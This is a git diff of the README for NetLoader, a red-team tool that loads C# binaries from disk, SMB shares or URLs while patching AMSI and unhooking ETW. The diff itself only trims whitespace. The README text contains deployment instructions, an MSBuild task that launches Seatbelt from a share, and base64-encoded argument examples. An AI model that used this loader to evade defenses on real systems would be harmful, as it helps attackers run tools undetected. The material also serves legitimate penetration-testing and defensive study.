@@ -3,7 +3,7 @@ Loads any C# binary from filepath or url, patching AMSI and unhooks ETW
 
 ** 01.10.2021 : Non-Obfuscated source code + SharpSploit to 'bypass' userland hooks when patching AMSI and ETW**
 
-**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!.  
+**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!.
 SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.
 
 # Compile
@@ -19,7 +19,7 @@ Arguments have to be added into the bottom XML file when NetLoader is deployed u
 	    public class ClassExample : Task, ITask
 	    {
 	        public override bool Execute()
-	        {	//Add your arguments here 
+	        {	//Add your arguments here
 	            SoullikePrincelier.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
 	            return true;
 	        }
@@ -62,7 +62,7 @@ Deploy payload from local path or SMB share (note that NetLoader automatically d
 	[*] Completed collection in 0,008 seconds
 
 
-Supports base64 inputs for those long strings that would usually break stuff! 
+Supports base64 inputs for those long strings that would usually break stuff!
 
 	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --b64 --path U2VhdGJlbHQuZXhl --args d2hvYW1p
 	[!] ~Flangvik , ~Arno0x #NetLoader
